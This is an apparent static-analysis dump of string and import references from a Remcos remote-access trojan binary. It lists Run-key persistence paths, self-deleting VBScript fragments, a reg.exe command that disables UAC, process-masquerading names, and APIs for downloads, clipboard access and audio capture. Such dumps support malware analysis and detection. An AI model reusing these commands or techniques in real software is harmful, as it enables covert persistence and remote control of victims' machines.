reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x40b80b	0x463ad0	string	0x40b77f	Software\Microsoft\Windows\CurrentVersion\Run\
0x40b829	0x40b869	string	0x40b77f	_^][
0x40b84e	0x463b30	string	0x40b77f	Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\
0x40b89b	0x456240	import	0x40b871	KERNEL32.dll.CreateDirectoryW
0x40b93c	0x40bc4e	string	0x40b871	_^][
0x40b94c	0x4560b0	import	0x40b871	KERNEL32.dll.CopyFileW
0x40b9f0	0x40bc4e	string	0x40b871	_^][
0x40ba1b	0x456230	import	0x40b871	KERNEL32.dll.SetFileAttributesW
0x40ba3e	0x463bb4	string	0x40b871	\install.vbs
0x40ba43	0x463bd0	string	0x40b871	Temp
0x40ba6d	0x463bdc	string	0x40b871	WScript.Sleep 1000\n
0x40ba7b	0x463c08	string	0x40b871	Set fso = CreateObject("Scripting.FileSystemObject")\n
0x40bb47	0x463c98	string	0x40b871	""", 0
0x40bb57	0x463ca8	string	0x40b871	CreateObject("WScript.Shell").Run "cmd /c ""
0x40bbd2	0x463d08	string	0x40b871	fso.DeleteFile(Wscript.ScriptFullName)
0x40bc2a	0x456328	import	0x40b871	SHELL32.dll.ShellExecuteW
0x40bc36	0x456270	import	0x40b871	KERNEL32.dll.ExitProcess
0x40bca5	0x463ad0	string	0x40bc59	Software\Microsoft\Windows\CurrentVersion\Run\
0x40bcf6	0x463b30	string	0x40bc59	Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\
0x40bd3f	0x463d58	string	0x40bc59	exepath
0x40bd63	0x4562b4	import	0x40bc59	KERNEL32.dll.GetModuleFileNameW
0x40bd76	0x456080	import	0x40bc59	ADVAPI32.dll.RegDeleteKeyA
0x40bd8f	0x456230	import	0x40bc59	KERNEL32.dll.SetFileAttributesW
0x40bdbf	0x463d60	string	0x40bc59	.vbs
0x40be04	0x463bd0	string	0x40bc59	Temp
0x40be43	0x463c08	string	0x40bc59	Set fso = CreateObject("Scripting.FileSystemObject")\n
0x40be52	0x463d6c	string	0x40bc59	On Error Resume Next\n
0x40be86	0x463da0	string	0x40bc59	while fso.FileExists("
0x40bed3	0x463dd8	string	0x40bc59	fso.DeleteFile "
0x40bf22	0x463dfc	string	0x40bc59	wend\n
0x40bf40	0x40bf7f	string	0x40bc59	h\b=F
0x40bf48	0x463e08	string	0x40bc59	fso.DeleteFolder "
0x40bf7f	0x463d08	string	0x40bc59	fso.DeleteFile(Wscript.ScriptFullName)
0x40bfd0	0x456328	import	0x40bc59	SHELL32.dll.ShellExecuteW
0x40bfd7	0x456270	import	0x40bc59	KERNEL32.dll.ExitProcess
0x40c02a	0x463ad0	string	0x40bfde	Software\Microsoft\Windows\CurrentVersion\Run\
0x40c07b	0x463b30	string	0x40bfde	Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\
0x40c0b0	0x463d58	string	0x40bfde	exepath
0x40c0d6	0x4562b4	import	0x40bfde	KERNEL32.dll.GetModuleFileNameW
0x40c0e9	0x456080	import	0x40bfde	ADVAPI32.dll.RegDeleteKeyA
0x40c0ef	0x456230	import	0x40bfde	KERNEL32.dll.SetFileAttributesW
0x40c120	0x40c134	string	0x40bfde	h0>F
0x40c134	0x463e30	string	0x40bfde	\update.vbs
0x40c139	0x463bd0	string	0x40bfde	Temp
0x40c163	0x463c08	string	0x40bfde	Set fso = CreateObject("Scripting.FileSystemObject")\n
0x40c172	0x463d6c	string	0x40bfde	On Error Resume Next\n
0x40c1a5	0x463da0	string	0x40bfde	while fso.FileExists("
0x40c1f3	0x463dd8	string	0x40bfde	fso.DeleteFile "
0x40c242	0x463dfc	string	0x40bfde	wend\n
0x40c260	0x40c29b	string	0x40bfde	ht<F
0x40c264	0x463e08	string	0x40bfde	fso.DeleteFolder "
0x40c2a0	0x463c98	string	0x40bfde	""", 0
0x40c2ba	0x463ca8	string	0x40bfde	CreateObject("WScript.Shell").Run "cmd /c ""
0x40c32c	0x463d08	string	0x40bfde	fso.DeleteFile(Wscript.ScriptFullName)
0x40c37d	0x456328	import	0x40bfde	SHELL32.dll.ShellExecuteW
0x40c389	0x456270	import	0x40bfde	KERNEL32.dll.ExitProcess
0x40c3ea	0x463d58	string	0x40c3b8	exepath
0x40c407	0x40c418	string	0x40c3b8	h`=F
0x40c412	0x4562b4	import	0x40c3b8	KERNEL32.dll.GetModuleFileNameW
0x40c418	0x463d60	string	0x40c3b8	.vbs
0x40c453	0x463bd0	string	0x40c3b8	Temp
0x40c49a	0x463c98	string	0x40c3b8	""", 0
0x40c4b2	0x463ca8	string	0x40c3b8	CreateObject("WScript.Shell").Run "cmd /c ""
0x40c520	0x463e48	string	0x40c3b8	CreateObject("Scripting.FileSystemObject").DeleteFile(Wscript.ScriptFullName)
0x40c571	0x456328	import	0x40c3b8	SHELL32.dll.ShellExecuteW
0x40c57d	0x456270	import	0x40c3b8	KERNEL32.dll.ExitProcess
0x40c61f	0x463bd0	string	0x40c5ed	Temp
0x40c64a	0x463ee4	string	0x40c5ed	SystemDrive
0x40c654	0x463efc	string	0x40c5ed	WinDir
0x40c665	0x40c6b9	string	0x40c5ed	h ?F
0x40c667	0x463f0c	string	0x40c5ed	\system32
0x40c676	0x463efc	string	0x40c5ed	WinDir
0x40c6b9	0x463f20	string	0x40c5ed	\SysWOW64
0x40c6c8	0x463efc	string	0x40c5ed	WinDir
0x40c70a	0x4638ec	string	0x40c5ed	AppData
0x40c711	0x463954	string	0x40c5ed	UserProfile
0x40c718	0x463f50	string	0x40c5ed	ProgramData
0x40c727	0x463f34	string	0x40c5ed	ProgramFiles
0x40c753	0x45616c	import	0x40c5ed	KERNEL32.dll.GetLongPathNameW
0x40c8ed	0x463f68	string	0x40c8d8	Unknown exception
0x40c9b8	0x463f7c	string	0x40c9b5	bad cast
0x40d11c	0x463f9c	string	0x40d107	generic
0x40d176	0x463fa4	string	0x40d161	iostream
0x40d188	0x463fb0	string	0x40d17c	iostream stream error
0x40d21a	0x463fc8	string	0x40d1f0	ios_base::badbit set
0x40d240	0x463fe0	string	0x40d1f0	ios_base::failbit set
0x40d24d	0x463ff8	string	0x40d1f0	ios_base::eofbit set
0x40d3cb	0x43a3b5	string	0x40d3c6	j\fh0
0x40d465	0x464014	string	0x40d3f0	license_code.txt
0x40dd99	0x419493	string	0x40dd83	SWj\nh,
0x40de4e	0x4562b4	import	0x40de34	KERNEL32.dll.GetModuleFileNameW
0x40de79	0x4560bc	import	0x40de34	KERNEL32.dll.CreateToolhelp32Snapshot
0x40de95	0x4560c8	import	0x40de34	KERNEL32.dll.Process32FirstW
0x40df14	0x4560c4	import	0x40de34	KERNEL32.dll.Process32NextW
0x40df23	0x4562b8	import	0x40de34	KERNEL32.dll.CloseHandle
0x40e047	0x4560b4	import	0x40de34	KERNEL32.dll.CreateMutexA
0x40e071	0x41a20f	string	0x40de34	QSUW3ۋ blocks=Basic Latin,Arabic
0x40e0a2	0x464098	string	0x40de34	C:\Program Files(x86)\Internet Explorer\
0x40e0b9	0x4640ec	string	0x40de34	ieinstal.exe
0x40e0fa	0x464108	string	0x40de34	ielowutil.exe
0x40e133	0x4562b8	import	0x40de34	KERNEL32.dll.CloseHandle
0x40e1a3	0x464130	string	0x40e18d	pth_unenc
0x40e1b2	0x464124	string	0x40e18d	override
0x40e21e	0x464144	string	0x40e18d	3.8.0 Pro
0x40e243	0x4562b0	import	0x40e18d	KERNEL32.dll.Sleep
0x40e28d	0x464144	string	0x40e18d	3.8.0 Pro
0x40e2b4	0x456270	import	0x40e18d	KERNEL32.dll.ExitProcess
0x40e2cf	0x4560b8	import	0x40e2bb	KERNEL32.dll.GetLocaleInfoA
0x40e305	0x4560bc	import	0x40e2e7	KERNEL32.dll.CreateToolhelp32Snapshot
0x40e329	0x4560c8	import	0x40e2e7	KERNEL32.dll.Process32FirstW
0x40e338	0x4560c4	import	0x40e2e7	KERNEL32.dll.Process32NextW
0x40e4e0	0x4560c4	import	0x40e2e7	KERNEL32.dll.Process32NextW
0x40e4ef	0x4562b8	import	0x40e2e7	KERNEL32.dll.CloseHandle
0x40e53d	0x464160	string	0x40e501	/k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
0x40e542	0x4641e4	string	0x40e501	C:\Windows\System32\cmd.exe
0x40e547	0x45627c	import	0x40e501	KERNEL32.dll.CreateProcessA
0x40e550	0x4562b8	import	0x40e501	KERNEL32.dll.CloseHandle
0x40e6d6	0x43a647	string	0x40e699	j\fhP
0x40e902	0x40ea66	string	0x40e8c8	_^][
0x40e913	0x40ea66	string	0x40e8c8	_^][
0x40ea3d	0x4029ba	string	0x40e8c8	SUVW
0x40f35c	0x40f444	string	0x40f30b	_^][
0x40f440	0x40f444	string	0x40f30b	_^][
0x40ff79	0x4562a4	import	0x40ff5a	KERNEL32.dll.SetEvent
0x410014	0x45644c	import	0x40ff5a	WS2_32.dll.inet_ntoa
0x4100d8	0x4642f0	string	0x40ff5a	StartForward
0x4100e4	0x464300	string	0x40ff5a	StartReverse
0x4100f5	0x464310	string	0x40ff5a	StopForward
0x410106	0x46431c	string	0x40ff5a	StopReverse
0x410117	0x464328	string	0x40ff5a	GetDirectListeningPort
0x410207	0x4560d0	import	0x410201	KERNEL32.dll.SetLastError
0x41036a	0x4103b0	string	0x410317	_^YÃ blocks=Basic Latin,Latin-1 Supplement
0x4103a4	0x4560cc	import	0x410317	KERNEL32.dll.VirtualProtect
0x4105f1	0x4560ec	import	0x4105c4	KERNEL32.dll.IsBadReadPtr
0x4106bd	0x4560ec	import	0x4105c4	KERNEL32.dll.IsBadReadPtr
0x4106df	0x4560d0	import	0x4105c4	KERNEL32.dll.SetLastError
0x4106f6	0x4560d0	import	0x4105c4	KERNEL32.dll.SetLastError
0x410718	0x4560d8	import	0x410708	KERNEL32.dll.VirtualAlloc
0x41072b	0x4560d4	import	0x41071f	KERNEL32.dll.VirtualFree
0x410736	0x456278	import	0x41071f	KERNEL32.dll.LoadLibraryA
0x410745	0x456274	import	0x41071f	KERNEL32.dll.GetProcAddress
0x410750	0x4560e8	import	0x41071f	KERNEL32.dll.FreeLibrary
0x41079c	0x4560d0	import	0x410763	KERNEL32.dll.SetLastError
0x41080a	0x4560dc	import	0x410763	KERNEL32.dll.GetNativeSystemInfo
0x41082e	0x4560d0	import	0x410763	KERNEL32.dll.SetLastError
0x410853	0x410871	string	0x410763	j@j\b
0x41086b	0x410871	string	0x410763	j@j\b
0x410875	0x4560e4	import	0x410763	KERNEL32.dll.GetProcessHeap
0x41087c	0x4560e0	import	0x410763	KERNEL32.dll.HeapAlloc
0x41093b	0x410518	string	0x410763	QQSU
0x41098f	0x4560d0	import	0x410763	KERNEL32.dll.SetLastError
0x4109b6	0x41099e	string	0x410763	_^][
0x410a0e	0x410a24	string	0x4109cc	9{0um
0x410ac8	0x410ad4	string	0x4109cc	_^][
0x410acc	0x4560d0	import	0x4109cc	KERNEL32.dll.SetLastError
0x410b4c	0x4560e4	import	0x410adc	KERNEL32.dll.GetProcessHeap
0x410b53	0x456290	import	0x410adc	KERNEL32.dll.HeapFree
0x410b6b	0x4560fc	import	0x410b5c	KERNEL32.dll.GetCurrentProcessId
0x410bab	0x4560c0	import	0x410b5c	KERNEL32.dll.OpenMutexA
0x410bba	0x4562b8	import	0x410b5c	KERNEL32.dll.CloseHandle
0x410bc5	0x4691e0	string	0x410b5c	Remcos restarted by watchdog!
0x410be9	0x469200	string	0x410b5c	Watchdog module activated
0x410c10	0x4562a0	import	0x410b5c	KERNEL32.dll.CreateThread
0x410c57	0x41a20f	string	0x410b5c	QSUW3ۋ blocks=Basic Latin,Arabic
0x410c80	0x463efc	string	0x410b5c	WinDir
0x410cc6	0x469238	string	0x410b5c	\SysWOW64\
0x410cd5	0x463efc	string	0x410b5c	WinDir
0x410d2a	0x469250	string	0x410b5c	svchost.exe
0x410d4f	0x469268	string	0x410b5c	rmclient.exe
0x410d74	0x469284	string	0x410b5c	fsutil.exe
0x410de8	0x46929c	string	0x410b5c	Watchdog launch failed!
0x410e0f	0x4562b8	import	0x410b5c	KERNEL32.dll.CloseHandle
0x410eb0	0x4560f4	import	0x410ea4	KERNEL32.dll.OpenProcess
0x410ebb	0x4562ac	import	0x410ea4	KERNEL32.dll.WaitForSingleObject
0x410ec2	0x4562b8	import	0x410ea4	KERNEL32.dll.CloseHandle
0x410ef9	0x4560b4	import	0x410eda	KERNEL32.dll.CreateMutexA
0x410f05	0x456270	import	0x410eda	KERNEL32.dll.ExitProcess
0x410f31	0x463d58	string	0x410eda	exepath
0x410f5f	0x41a20f	string	0x410eda	QSUW3ۋ blocks=Basic Latin,Arabic
0x410f7f	0x4562c0	import	0x410eda	KERNEL32.dll.CreateFileW
0x410f8e	0x4560f4	import	0x410eda	KERNEL32.dll.OpenProcess
0x410f99	0x4562ac	import	0x410eda	KERNEL32.dll.WaitForSingleObject
0x410fa0	0x4562b8	import	0x410eda	KERNEL32.dll.CloseHandle
0x410fa6	0x4560fc	import	0x410eda	KERNEL32.dll.GetCurrentProcessId
0x410fca	0x456328	import	0x410eda	SHELL32.dll.ShellExecuteW
0x410fd7	0x456334	import	0x410eda	SHLWAPI.dll.PathFileExistsW
0x41103a	0x4560f0	import	0x410eda	KERNEL32.dll.GetTempPathW
0x411048	0x4692b4	string	0x410eda	temp_
0x411054	0x456100	import	0x410eda	KERNEL32.dll.GetTempFileNameW
0x41105a	0x4692c0	string	0x410eda	.exe
0x411066	0x4560f8	import	0x410eda	KERNEL32.dll.lstrcatW
0x4110e7	0x4562b0	import	0x410eda	KERNEL32.dll.Sleep
0x4110fc	0x4560f4	import	0x410eda	KERNEL32.dll.OpenProcess
0x411107	0x4562ac	import	0x410eda	KERNEL32.dll.WaitForSingleObject
0x41110e	0x4562b8	import	0x410eda	KERNEL32.dll.CloseHandle
0x411114	0x4560fc	import	0x410eda	KERNEL32.dll.GetCurrentProcessId
0x411168	0x463d58	string	0x411140	exepath
0x4111d8	0x411249	string	0x411140	_^][
0x4111df	0x4562b0	import	0x411140	KERNEL32.dll.Sleep
0x41129e	0x4562b0	import	0x411253	KERNEL32.dll.Sleep
0x4112c5	0x456288	import	0x4112b5	KERNEL32.dll.TerminateProcess
0x4112d8	0x4562ac	import	0x4112b5	KERNEL32.dll.WaitForSingleObject
0x4118b2	0x4562b4	import	0x411899	KERNEL32.dll.GetModuleFileNameW
0x4118dc	0x4562b0	import	0x411899	KERNEL32.dll.Sleep
0x41198c	0x4692cc	string	0x411899	/stext "
0x411a2e	0x4692cc	string	0x411899	/stext "
0x411acd	0x4692cc	string	0x411899	/stext "
0x411b84	0x41a20f	string	0x411899	QSUW3ۋ blocks=Basic Latin,Arabic
0x411b9f	0x45624c	import	0x411899	KERNEL32.dll.DeleteFileW
0x411bb7	0x41a20f	string	0x411899	QSUW3ۋ blocks=Basic Latin,Arabic
0x411bcf	0x45624c	import	0x411899	KERNEL32.dll.DeleteFileW
0x411bea	0x41a20f	string	0x411899	QSUW3ۋ blocks=Basic Latin,Arabic
0x411c05	0x45624c	import	0x411899	KERNEL32.dll.DeleteFileW
0x411f01	0x456068	import	0x411eea	ADVAPI32.dll.RegOpenKeyExA
0x411f15	0x456054	import	0x411eea	ADVAPI32.dll.RegQueryValueExA
0x411f20	0x45604c	import	0x411eea	ADVAPI32.dll.RegCloseKey
0x411f54	0x456068	import	0x411f34	ADVAPI32.dll.RegOpenKeyExA
0x411f72	0x456054	import	0x411f34	ADVAPI32.dll.RegQueryValueExA
0x411f7d	0x45604c	import	0x411f34	ADVAPI32.dll.RegCloseKey
0x411fb5	0x456068	import	0x411f91	ADVAPI32.dll.RegOpenKeyExA
0x411fd2	0x456054	import	0x411f91	ADVAPI32.dll.RegQueryValueExA
0x411fdd	0x45604c	import	0x411f91	ADVAPI32.dll.RegCloseKey
0x411fe7	0x411ff4	string	0x411f91	hP0F
0x412030	0x45606c	import	0x412006	ADVAPI32.dll.RegOpenKeyExW
0x41204b	0x45607c	import	0x412006	ADVAPI32.dll.RegQueryValueExW
0x412054	0x45604c	import	0x412006	ADVAPI32.dll.RegCloseKey
0x41209b	0x45607c	import	0x412077	ADVAPI32.dll.RegQueryValueExW
0x4120d1	0x45607c	import	0x412077	ADVAPI32.dll.RegQueryValueExW
0x412104	0x456068	import	0x4120e8	ADVAPI32.dll.RegOpenKeyExA
0x41211d	0x456054	import	0x4120e8	ADVAPI32.dll.RegQueryValueExA
0x412128	0x45604c	import	0x4120e8	ADVAPI32.dll.RegCloseKey
0x41216e	0x456048	import	0x41215f	ADVAPI32.dll.RegCreateKeyA
0x412176	0x4121af	string	0x41215f	2ۍM\f blocks=Basic Latin,Arabic
0x412196	0x456064	import	0x41215f	ADVAPI32.dll.RegSetValueExA
0x4121a1	0x45604c	import	0x41215f	ADVAPI32.dll.RegCloseKey
0x4121ca	0x456070	import	0x4121c0	ADVAPI32.dll.RegCreateKeyW
0x4121e5	0x456060	import	0x4121c0	ADVAPI32.dll.RegSetValueExW
0x4121f0	0x45604c	import	0x4121c0	ADVAPI32.dll.RegCloseKey
0x41220f	0x456070	import	0x412204	ADVAPI32.dll.RegCreateKeyW
0x412217	0x412257	string	0x412204	2ۍM\f blocks=Basic Latin,Arabic
0x41223e	0x456060	import	0x412204	ADVAPI32.dll.RegSetValueExW
0x412249	0x45604c	import	0x412204	ADVAPI32.dll.RegCloseKey
0x412276	0x456048	import	0x412268	ADVAPI32.dll.RegCreateKeyA
0x412291	0x456064	import	0x412268	ADVAPI32.dll.RegSetValueExA
0x41229c	0x45604c	import	0x412268	ADVAPI32.dll.RegCloseKey
0x4122ba	0x456070	import	0x4122b0	ADVAPI32.dll.RegCreateKeyW
0x4122d5	0x456060	import	0x4122b0	ADVAPI32.dll.RegSetValueExW
0x4122e0	0x45604c	import	0x4122b0	ADVAPI32.dll.RegCloseKey
0x4122fe	0x456070	import	0x4122f4	ADVAPI32.dll.RegCreateKeyW
0x412319	0x456060	import	0x4122f4	ADVAPI32.dll.RegSetValueExW
0x412324	0x45604c	import	0x4122f4	ADVAPI32.dll.RegCloseKey
0x412422	0x45606c	import	0x412414	ADVAPI32.dll.RegOpenKeyExW
0x412436	0x456074	import	0x412414	ADVAPI32.dll.RegDeleteValueW
0x4124ad	0x456050	import	0x412446	ADVAPI32.dll.RegQueryInfoKeyW
0x4124dc	0x45605c	import	0x412446	ADVAPI32.dll.RegEnumKeyExW
0x41257c	0x456078	import	0x412446	ADVAPI32.dll.RegEnumValueW
0x412608	0x4692e0	string	0x412446	[regsplt]
0x412671	0x4692ec	string	0x41266d	HKLM
0x412689	0x4692f4	string	0x41266d	HKCU
0x4126a1	0x4692fc	string	0x41266d	HKCR
0x4126d1	0x469308	string	0x41266d	HKCC
0x412737	0x45606c	import	0x4126fe	ADVAPI32.dll.RegOpenKeyExW
0x4128a5	0x45604c	import	0x4126fe	ADVAPI32.dll.RegCloseKey
0x4128b4	0x4630b8	string	0x4126fe	310M
0x4129b8	0x456058	import	0x4128e3	ADVAPI32.dll.RegCreateKeyExW
0x4129c4	0x45604c	import	0x4128e3	ADVAPI32.dll.RegCloseKey
0x412c3c	0x469310	string	0x4128e3	4567
0x412cb5	0x469330	string	0x4128e3	Shlwapi.dll
0x412cba	0x456278	import	0x4128e3	KERNEL32.dll.LoadLibraryA
0x412cc1	0x456274	import	0x4128e3	KERNEL32.dll.GetProcAddress
0x4130a9	0x456458	import	0x41307d	WS2_32.dll.inet_addr
0x4130ba	0x4130be	string	0x41307d	_^][
0x413143	0x456450	import	0x41312a	WS2_32.dll.gethostbyname
0x413172	0x4130c3	string	0x41312a	SVWj j
0x4131a1	0x4131c6	string	0x41312a	_^][Y
0x4131a6	0x4131c6	string	0x41312a	_^][Y
0x4131a8	0x456430	import	0x41312a	WS2_32.dll.WSAGetLastError
0x4132fe	0x4130c3	string	0x4132e7	SVWj j
0x4133a8	0x4135fc	string	0x413325	_^][
0x4133ed	0x4135fc	string	0x413325	_^][
0x413402	0x4135fc	string	0x413325	_^][
0x413422	0x4135fc	string	0x413325	_^][
0x41345b	0x45646c	import	0x413325	WS2_32.dll.htons
0x41348e	0x4135fc	string	0x413325	_^][
0x4134a5	0x456468	import	0x413325	WS2_32.dll.getservbyname
0x4134d2	0x456468	import	0x413325	WS2_32.dll.getservbyname
0x413508	0x4135fc	string	0x413325	_^][
0x413538	0x41307d	string	0x413325	SUVW
0x413584	0x456470	import	0x413325	WS2_32.dll.htonl
0x413597	0x4130c3	string	0x413325	SVWj j
0x4135b8	0x45644c	import	0x413325	WS2_32.dll.inet_ntoa
0x41364d	0x4137d2	string	0x413325	_^][
0x41368b	0x4137d2	string	0x413325	_^][
0x4136c3	0x456460	import	0x413325	WS2_32.dll.getservbyport
0x4136dd	0x456464	import	0x413325	WS2_32.dll.ntohs
0x41374c	0x45645c	import	0x413325	WS2_32.dll.gethostbyaddr
0x413779	0x456430	import	0x413325	WS2_32.dll.WSAGetLastError
0x413794	0x4137d2	string	0x413325	_^][
0x41379b	0x4137d2	string	0x413325	_^][
0x4137a1	0x45644c	import	0x413325	WS2_32.dll.inet_ntoa
0x4137c4	0x4137d2	string	0x413325	_^][
0x4137cb	0x4137d2	string	0x413325	_^][
0x4137e9	0x469358	string	0x4137dc	getaddrinfo
0x4137f8	0x469364	string	0x4137dc	getnameinfo
0x413808	0x469370	string	0x4137dc	freeaddrinfo
0x41382b	0x456108	import	0x4137dc	KERNEL32.dll.GetSystemDirectoryA
0x413855	0x469380	string	0x4137dc	\ws2_32
0x41386d	0x456278	import	0x4137dc	KERNEL32.dll.LoadLibraryA
0x413873	0x456274	import	0x4137dc	KERNEL32.dll.GetProcAddress
0x41387b	0x4560e8	import	0x4137dc	KERNEL32.dll.FreeLibrary
0x413887	0x469358	string	0x4137dc	getaddrinfo
0x4138b4	0x469388	string	0x4137dc	\wship6
0x4138cc	0x456278	import	0x4137dc	KERNEL32.dll.LoadLibraryA
0x4138d6	0x413925	string	0x4137dc	_^][
0x4138d8	0x469358	string	0x4137dc	getaddrinfo
0x4138eb	0x413925	string	0x4137dc	_^][
0x4138f4	0x456274	import	0x4137dc	KERNEL32.dll.GetProcAddress
0x413911	0x413925	string	0x4137dc	_^][
0x413966	0x456454	import	0x41393f	WS2_32.dll.WSASetLastError
0x4139d1	0x4562b0	import	0x413980	KERNEL32.dll.Sleep
0x413b3b	0x4693a0	string	0x413980	TLS Off
0x413b49	0x469398	string	0x413980	TLS On
0x413b5e	0x4693ac	string	0x413980	Connecting |
0x413be2	0x456430	import	0x413980	WS2_32.dll.WSAGetLastError
0x413bf5	0x4693bc	string	0x413980	Connection Error:
0x413c40	0x4693d0	string	0x413980	Connection Error: Unable to create socket
0x413ca4	0x4693fc	string	0x413980	Connected |
0x413d4c	0x46940c	string	0x413980	%I64u
0x413dbc	0x469414	string	0x413980	name
0x413de9	0x46941c	string	0x413980	hlight
0x413e85	0x456114	import	0x413980	KERNEL32.dll.GetTickCount
0x413f03	0x464144	string	0x413980	3.8.0 Pro
0x414437	0x469424	string	0x413980	Disconnected
0x41446d	0x4562a0	import	0x413980	KERNEL32.dll.CreateThread
0x4144c7	0x4562b0	import	0x413980	KERNEL32.dll.Sleep
0x4144fc	0x4562a4	import	0x4144da	KERNEL32.dll.SetEvent
0x41457c	0x456114	import	0x4144da	KERNEL32.dll.GetTickCount
0x414738	0x4560fc	import	0x4144da	KERNEL32.dll.GetCurrentProcessId
0x4147a7	0x419ae9	string	0x4144da	SVQ3
0x4147cb	0x4563d4	import	0x4144da	USER32.dll.CloseWindow
0x4147f2	0x4563dc	import	0x4144da	USER32.dll.ShowWindow
0x414820	0x456350	import	0x4144da	USER32.dll.GetWindowThreadProcessId
0x41482a	0x419ae9	string	0x4144da	SVQ3
0x414870	0x469478	string	0x4144da	cmd.exe
0x41487b	0x456328	import	0x4144da	SHELL32.dll.ShellExecuteW
0x4148f3	0x456328	import	0x4144da	SHELL32.dll.ShellExecuteW
0x414b8b	0x456408	import	0x4144da	WINMM.dll.waveInStop
0x414b97	0x456424	import	0x4144da	WINMM.dll.waveInClose
0x414bf4	0x45624c	import	0x4144da	KERNEL32.dll.DeleteFileW
0x414c06	0x456270	import	0x4144da	KERNEL32.dll.ExitProcess
0x414c0e	0x4562b0	import	0x4144da	KERNEL32.dll.Sleep
0x414c2d	0x4562b0	import	0x4144da	KERNEL32.dll.Sleep
0x414c8f	0x4564a0	import	0x4144da	urlmon.dll.URLDownloadToFileW
0x414cbb	0x4562b0	import	0x4144da	KERNEL32.dll.Sleep
0x414d6f	0x4563e4	import	0x4144da	USER32.dll.MessageBoxW
0x414e56	0x456360	import	0x4144da	USER32.dll.ExitWindowsEx
0x414e61	0x469488	string	0x4144da	SetSuspendState
0x414e66	0x469498	string	0x4144da	PowrProf.dll
0x414e6b	0x456278	import	0x4144da	KERNEL32.dll.LoadLibraryA
0x414e72	0x456274	import	0x4144da	KERNEL32.dll.GetProcAddress
0x414e84	0x4630b8	string	0x4144da	310M
0x414ea2	0x469310	string	0x4144da	4567
0x414ec2	0x456394	import	0x4144da	USER32.dll.OpenClipboard
0x414ed0	0x4563d8	import	0x4144da	USER32.dll.EmptyClipboard
0x414ef0	0x45610c	import	0x4144da	KERNEL32.dll.GlobalAlloc
0x414ef9	0x456110	import	0x4144da	KERNEL32.dll.GlobalLock
0x414f2f	0x456118	import	0x4144da	KERNEL32.dll.GlobalUnlock
0x414f38	0x456358	import	0x4144da	USER32.dll.SetClipboardData
0x414f41	0x456394	import	0x4144da	USER32.dll.OpenClipboard
0x414f4f	0x4563d8	import	0x4144da	USER32.dll.EmptyClipboard
0x414f55	0x456390	import	0x4144da	USER32.dll.CloseClipboard
0x414f5c	0x456394	import	0x4144da	USER32.dll.OpenClipboard
0x414f6c	0x456378	import	0x4144da	USER32.dll.GetClipboardData
0x414f75	0x456110	import	0x4144da	KERNEL32.dll.GlobalLock
0x414f7e	0x456118	import	0x4144da	KERNEL32.dll.GlobalUnlock
0x414f84	0x456390	import	0x4144da	USER32.dll.CloseClipboard
0x4150e9	0x469414	string	0x4144da	name
0x4152f9	0x456330	import	0x4144da	SHLWAPI.dll.StrToIntA
0x415407	0x4563e0	import	0x4144da	USER32.dll.SetWindowTextW
0x415471	0x46941c	string	0x4144da	hlight
0x41552c	0x4562a0	import	0x4144da	KERNEL32.dll.CreateThread
0x415546	0x4563dc	import	0x4144da	USER32.dll.ShowWindow
0x415552	0x456354	import	0x4144da	USER32.dll.SetForegroundWindow
0x4159c5	0x4694a8	string	0x4159ba	\sysinfo.txt
0x4159ca	0x4694c4	string	0x4159ba	temp
0x415a0f	0x4694d8	string	0x4159ba	dxdiag
0x415a1a	0x456328	import	0x4159ba	SHELL32.dll.ShellExecuteW
0x415a3f	0x41a20f	string	0x4159ba	QSUW3ۋ blocks=Basic Latin,Arabic
0x415a46	0x4562b0	import	0x4159ba	KERNEL32.dll.Sleep
0x415a7a	0x45624c	import	0x4159ba	KERNEL32.dll.DeleteFileW
0x415b2e	0x456370	import	0x415b11	USER32.dll.GetWindowTextW
0x415b37	0x4563e8	import	0x415b11	USER32.dll.IsWindowVisible
0x415c59	0x45635c	import	0x415c41	USER32.dll.EnumWindows
0x415c9d	0x456104	import	0x415c90	KERNEL32.dll.GetCurrentProcess
0x415ca4	0x456044	import	0x415c90	ADVAPI32.dll.OpenProcessToken
0x415cb0	0x4694f0	string	0x415c90	SeShutdownPrivilege
0x415cb6	0x456040	import	0x415c90	ADVAPI32.dll.LookupPrivilegeValueA
0x415cd5	0x45603c	import	0x415c90	ADVAPI32.dll.AdjustTokenPrivileges
